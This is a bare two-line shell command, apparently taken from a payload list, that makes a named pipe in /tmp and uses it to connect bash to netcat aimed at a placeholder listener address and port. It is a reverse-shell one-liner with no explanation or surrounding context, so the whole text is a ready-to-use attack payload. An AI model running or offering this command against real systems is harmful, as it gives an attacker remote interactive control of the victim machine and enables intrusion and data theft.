mknod /tmp/backpipe p &&
/bin/bash 0</tmp/backpipe | /bin/nc [LIP] [LP] 1>/tmp/backpipe